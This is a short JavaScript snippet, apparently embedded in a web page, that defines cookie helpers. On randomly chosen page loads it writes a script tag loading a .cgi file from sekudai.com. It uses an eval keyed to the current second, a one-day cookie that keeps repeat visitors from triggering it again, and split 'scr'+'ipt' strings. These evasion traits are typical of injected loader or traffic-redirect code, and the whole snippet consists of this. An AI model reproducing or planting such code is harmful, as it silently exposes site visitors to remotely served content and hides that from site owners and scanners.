//<![CDATA[ 
function setCookieSX(c_name,value,exdays) { var exdate=new Date(); exdate.setDate(exdate.getDate() + exdays); var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString()+"; path=/"); document.cookie=c_name + "=" + c_value; }
function getCookieSX(c_name) { var i,x,y,ARRcookies=document.cookie.split(";"); for (i=0;i<ARRcookies.length;i++) { x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("=")); y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1); x=x.replace(/^\s+|\s+$/g,""); if (x==c_name) { return unescape(y); } } }

var signalsx;var waktu=new Date();
function boleh() { if (/sekudai\.com/i.test(document.referrer)){signalsx='ok';return true;} if(getCookieSX("adam") == "bA6kgTU46E"){signalsx='';return false;}    var secondSX=waktu.getSeconds();var dibenar="-1-11-12-16-20-21-27-28-29-30-31-32-33-36-37-39-4-42-44-47-49-5-53-54-57-59-7-8-9-";eval("if(dibenar.match(/-" + secondSX + "-/g)){signalsx='ok';}");
 }
boleh();
if (signalsx=='ok') { if(!/sekudai\.com/i.test(document.referrer)){setCookieSX("adam","bA6kgTU46E",1);} document.write('<scr' + 'ipt src="http://sekudai.com/14274324041500.cgi"></sc' + 'ript>'); }

//]]>